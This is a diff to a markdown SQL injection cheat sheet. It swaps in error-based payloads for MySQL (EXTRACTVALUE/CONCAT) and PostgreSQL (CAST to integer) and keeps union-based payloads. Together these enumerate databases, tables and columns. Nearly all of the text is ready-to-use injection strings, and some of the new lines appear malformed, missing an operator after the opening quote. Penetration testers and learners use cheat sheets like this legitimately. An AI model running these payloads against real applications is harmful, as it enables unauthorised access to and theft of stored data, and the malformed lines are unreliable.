@@ -85,8 +85,8 @@ category: cheatsheets
 ### List databases:
 - Normal
     - `SHOW DATABASES;`
-- Error based
-    - `' AND (SELECT COUNT(*) FROM information_schema.schemata) -- `
+- Error based 32 character limit
+    - `'  EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--` 
 - Union Based
     - `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`
 - Stacked Queries:
@@ -96,7 +96,7 @@ category: cheatsheets
 - Normal
     - `SHOW TABLES;`
 - Error based
-    - `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'database_name') --`
+    - `'  EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--`
 - Union Based
     - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --`
 - Stacked Queries:
@@ -106,7 +106,7 @@ category: cheatsheets
 - Normal
     - `SHOW COLUMNS FROM table_name;`
 - Error based
-    - `' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
+    - `'  EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--`
 - Union Based
     - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
 - Stacked Queries:
@@ -131,7 +131,7 @@ category: cheatsheets
 - Normal
     - `SELECT datname FROM pg_database;`
 - Error based
-    - `AND (SELECT COUNT(*) FROM pg_database) --`
+    - `'  (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--`
 - Union Based
     - `' UNION SELECT datname, NULL FROM pg_database --`
 - Stacked Queries:
@@ -141,7 +141,7 @@ category: cheatsheets
 - Normal
     - `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`
 - Error based
-    - `AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public') --`
+    - `'  (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--`
 - Union Based
     - `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --`
 - Stacked Queries:
@@ -151,7 +151,7 @@ category: cheatsheets
 - Normal
     - `SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';`
 - Error based
-    - `AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
+    - `'  (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--`
 - Union Based
     - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
 - Stacked Queries:
